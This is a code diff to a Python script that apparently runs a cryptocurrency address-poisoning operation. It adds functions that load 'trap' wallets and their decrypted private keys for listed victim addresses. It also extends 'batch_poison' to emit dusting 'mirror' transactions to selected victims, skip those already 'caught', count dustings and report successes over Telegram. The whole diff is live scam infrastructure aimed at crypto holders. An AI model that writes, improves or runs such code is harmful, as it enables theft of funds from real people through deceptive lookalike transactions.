@@ -620,6 +620,61 @@ def get_trap_entries_from_db(campaign_id):
         logger.error(f"Failed to fetch traps from database: {e}")
     return entries
 
+def get_trap_entries_by_ids(trap_ids):
+    """Fetch specific traps by their IDs. Returns list of (trap_id, victim, key) tuples."""
+    entries = []
+    if not supabase:
+        logger.error("Supabase client not initialized.")
+        return entries
+    if not trap_ids:
+        return entries
+    try:
+        # Supabase .in() accepts lists - fetch in chunks of 500 to avoid query limits
+        for i in range(0, len(trap_ids), 500):
+            chunk = trap_ids[i:i + 500]
+            result = supabase.table("traps")\
+                .select("id, victim_address, trap_private_key_enc")\
+                .in_("id", chunk)\
+                .execute()
+            if not result.data:
+                continue
+            for row in result.data:
+                enc_key = row.get("trap_private_key_enc")
+                if not enc_key:
+                    continue
+                try:
+                    private_key = decrypt(enc_key)
+                    w3.eth.account.from_key(private_key)
+                    victim = row.get("victim_address", "").lower()
+                    if victim:
+                        entries.append((row.get("id"), victim, private_key))
+                except Exception as e:
+                    logger.error(f"Failed to decrypt private key for trap {row.get('id')}: {e}")
+                    continue
+        logger.info(f"Loaded {len(entries)} filtered trap entries by IDs")
+    except Exception as e:
+        logger.error(f"Failed to fetch traps by IDs: {e}")
+    return entries
+
+
+def update_trap_dust_count(trap_id):
+    """Increment dust_count and update last_dusted_at for a trap."""
+    if not supabase or not trap_id:
+        return
+    try:
+        now_iso = datetime.now(timezone.utc).isoformat()
+        # Fetch current dust_count, increment, and update
+        result = supabase.table("traps").select("dust_count").eq("id", trap_id).execute()
+        current_count = 0
+        if result.data and len(result.data) > 0:
+            current_count = result.data[0].get("dust_count", 0) or 0
+        supabase.table("traps").update({
+            "dust_count": current_count + 1,
+            "last_dusted_at": now_iso
+        }).eq("id", trap_id).execute()
+    except Exception as e:
+        logger.warning(f"Failed to update dust_count for trap {trap_id}: {e}")
+
 
 def get_counterparty_from_db(victim_address, campaign_id):
     """Fetch the counterparty address for a specific victim from the traps table."""
@@ -817,8 +872,20 @@ def fetch_last_transfer_from_blockchain(victim_address, counterparty_address):
         return (None, None)
 
 
-def batch_poison(job_id=None, campaign_id=None):
-    if campaign_id:
+def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
+    has_trap_ids = trap_ids is not None and len(trap_ids) > 0
+    entry_has_id = False  # Track if entries include trap ID (filtered mode)
+    
+    if has_trap_ids:
+        logger.info(f"Using filtered mode: {len(trap_ids)} specific trap IDs")
+        filtered_entries = get_trap_entries_by_ids(trap_ids)
+        if not filtered_entries:
+            logger.error("No traps found for the provided IDs")
+            return
+        # Convert to same format as normal mode but with trap_id: (trap_id, victim, key)
+        entries = filtered_entries
+        entry_has_id = True
+    elif campaign_id:
         logger.info(f"Using database for campaign {campaign_id}")
         entries = get_trap_entries_from_db(campaign_id)
         if not entries:
@@ -870,7 +937,14 @@ def batch_poison(job_id=None, campaign_id=None):
     success = 0
     gas_failures = 0
     
-    for i, (victim, key) in enumerate(entries, 1):
+    for i, entry in enumerate(entries, 1):
+        # Support both (victim, key) and (trap_id, victim, key) formats
+        if entry_has_id:
+            trap_id, victim, key = entry
+        else:
+            trap_id = None
+            victim, key = entry
+            
         if victim.lower() in caught:
             logger.info(f"Skipping caught victim {victim}")
             continue
@@ -901,6 +975,10 @@ def batch_poison(job_id=None, campaign_id=None):
         if tx_hash:
             success += 1
             logger.info(f"[{i}/{total}] ✅ Mirror event emitted: {tx_hash}")
+            
+            # 🆕 Update dust_count and last_dusted_at if we have trap_id
+            if trap_id:
+                update_trap_dust_count(trap_id)
             
             # Send individual Telegram notification for each successful mirror
             try:
@@ -980,6 +1058,14 @@ if __name__ == "__main__":
     
     job_id = args.job_id
     campaign_id = None
+    trap_ids = None
+    
+    # 🆕 Read TRAP_IDS from environment (comma-separated UUIDs)
+    trap_ids_env = os.getenv('TRAP_IDS', '').strip()
+    if trap_ids_env:
+        trap_ids = [tid.strip() for tid in trap_ids_env.split(',') if tid.strip()]
+        logger.info(f"[main] Received {len(trap_ids)} trap IDs via TRAP_IDS env var")
+    
     if job_id:
         update_job(job_id, status='running')
         campaign_id = get_campaign_id_from_job(job_id)
@@ -1041,4 +1127,4 @@ if __name__ == "__main__":
                 update_job(job_id, status='failed', message='Mirror emission failed')
             sys.exit(1)
     else:
-        batch_poison(job_id=job_id, campaign_id=campaign_id)
+        batch_poison(job_id=job_id, campaign_id=campaign_id, trap_ids=trap_ids)
